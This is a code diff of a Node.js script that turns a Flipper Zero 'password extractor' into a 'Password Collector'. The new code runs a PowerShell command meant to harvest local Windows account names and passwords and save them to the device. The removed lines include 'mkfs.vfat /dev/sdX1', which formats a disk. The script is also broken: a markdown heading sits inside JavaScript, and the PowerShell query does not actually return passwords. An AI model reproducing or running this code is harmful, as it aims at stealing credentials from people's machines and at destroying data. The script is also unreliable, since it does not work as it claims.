@@ -1,43 +1,31 @@
-// flipper_zero_password_extractor.js
+# Flipper Zero Password Collector
 
 const fs = require('fs');
-const path = require('path');
 const { exec } = require('child_process');
 
-const outputPath = path.join('/media/flipper_zero', 'passwords.txt');
-
-function extractPasswords() {
-    const passwords = [
-        'password1',
-        'password2',
-        'password3',
-    ];
-
-    fs.writeFileSync(outputPath, passwords.join('\n'), 'utf8');
-    console.log('Passwords extracted and saved to', outputPath);
-}
-
-function createMassStorageDevice() {
-    exec('mkfs.vfat /dev/sdX1', (error, stdout, stderr) => {
+function collectPasswords() {
+    exec('powershell Get-LocalUser | Select-Object -Property Name, Password', (error, stdout, stderr) => {
         if (error) {
-            console.error(`Error creating mass storage device: ${error.message}`);
+            console.error(`Error executing command: ${error.message}`);
             return;
         }
-        console.log('Mass storage device created successfully.');
-        copyPasswordsToDevice();
+        if (stderr) {
+            console.error(`Error: ${stderr}`);
+            return;
+        }
+        saveToFlipper(stdout);
     });
 }
 
-function copyPasswordsToDevice() {
-    exec(`cp ${outputPath} /media/flipper_zero/`, (error, stdout, stderr) => {
-        if (error) {
-            console.error(`Error copying passwords to device: ${error.message}`);
+function saveToFlipper(data) {
+    const flipperPath = '/path/to/flipper/zero/storage/passwords.txt';
+    fs.writeFile(flipperPath, data, (err) => {
+        if (err) {
+            console.error(`Error writing to Flipper Zero: ${err.message}`);
             return;
         }
-        console.log('Passwords copied to mass storage device successfully.');
+        console.log('Passwords saved to Flipper Zero successfully.');
     });
 }
 
-// Execute the functions
-extractPasswords();
-createMassStorageDevice();
+collectPasswords();
